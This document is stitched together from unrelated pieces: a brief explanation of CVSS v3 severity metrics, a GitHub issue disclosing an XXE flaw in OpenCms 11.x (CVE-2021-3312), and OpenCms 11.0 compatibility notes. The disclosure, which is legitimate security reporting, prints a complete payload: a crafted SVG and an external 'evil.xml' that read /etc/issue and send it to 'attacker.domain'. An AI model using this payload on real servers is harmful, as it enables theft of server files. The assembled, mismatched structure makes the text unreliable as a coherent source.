# CVSS v3 base metrics

Attack vector:
More severe the more the remote (logically and physically) an attacker can be in order to exploit the vulnerability.

Attack complexity:
More severe for the least complex attacks.

Privileges required:
More severe if no privileges are required.

User interaction:
More severe when no user interaction is required.

Scope:
More severe when a scope change occurs, e.g. one vulnerable component impacts resources in components beyond its security scope.

Confidentiality:
More severe when loss of data confidentiality is highest, measuring the level of data access available to an unauthorized user.

Integrity:
More severe when loss of data integrity is the highest, measuring the consequence of data modification possible by an unauthorized user.

Availability:
More severe when the loss of impacted component availability is highest.

### **[gWestenberger](/gWestenberger)** commented [Oct 7, 2021](#issue-1019763377)

| In OpenCms 11.x, it is possible for logged in users with edit permissions to exfiltrate data from the server's file system and send it to an external server by uploading specially crafted SVGs files.  Example in which the first line of /etc/issue is read and sent to the server "attacker.domain":  The SVG file to upload:  ``` <!DOCTYPE svg [ <!ELEMENT svg ANY > <!ENTITY % sp SYSTEM "http://attacker.domain/evil.xml"> %sp; ]> <svg viewBox="0 0 200 200" version="1.2" xlmns="http://www.w3.org/2000/svg" style="fill:red">         <text x="15" y="100" style="fill:black">&exfil;</text> </svg>   ```  The evil.xml file served by the external server "attacker.domain":  ``` <!ENTITY % file SYSTEM "file:///etc/issue"> <!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'http://attacker.domain/?%file;'>"> %eval; %exfil;  ```  CVE ID: [CVE-2021-3312](https://github.com/advisories/GHSA-g6v7-vqhx-6v6c "CVE-2021-3312"). |

## Backward compatibility

Notice for users of Alkacon OCEE: Current release versions of Alkacon OCEE are not compatible with OpenCms 11.0. Further information about the future of OCEE will be available soon on the Alkacon website.

## Compatibility with Java versions, servlet containers and databases

OpenCms 11.0 has been written and tested for Java 11 and Java 8. We have tested with ORACLEs JDK as well as OpenJDK. OpenCms should run with all compliant JVMs.

We have tested this release on the Tomcat servlet engine, which we recommend. OpenCms works "out of the box" with Tomcat 9, 8.5 or 8. Others have reported deploying OpenCms successfully on other servlet containers like JBoss, WildFly, WebLogic, WebSphere, GlassFish and Resin.

On the database side, we provide support for MySQL, MariaDB, Oracle, PostgreSQL, MS SQL Server, DB2 and HSQLDB.
